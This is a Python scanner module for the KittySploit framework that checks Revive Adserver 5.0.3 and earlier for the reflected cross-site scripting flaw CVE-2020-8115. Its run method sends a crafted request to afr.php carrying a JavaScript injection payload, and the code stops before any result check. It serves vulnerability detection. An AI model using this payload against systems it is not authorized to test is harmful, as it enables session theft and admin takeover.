#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Revive Adserver 5."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Revive Adserver <=5.0.3 - Cross-Site Scripting Detection',
        'description': 'Revive Adserver 5.0.3 and prior contains a reflected cross-site scripting vulnerability in the publicly accessible afr.php delivery script. In older versions, it is possible to steal the session identifier and gain access to the admin interface. The query string sent to the www/delivery/afr.php script is printed back without proper escaping, allowing an attacker to execute arbitrary JavaScript code on the browser of the victim.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'xss', 'hackerone', 'revive-adserver', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://hackerone.com/reports/775693',
            'https://www.revive-adserver.com/security/revive-sa-2020-001/',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-8115',
            'https://github.com/Elsfa7-110/kenzer-templates',
        ],
        'cve': 'CVE-2020-8115',
    }

    def run(self):
        r = self.http_request(method="GET", path='/www/delivery/afr.php?refresh=10000&")\',10000000);alert(1337);setTimeout(\'alert("', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body_any = ('window.location.href.indexOf',)
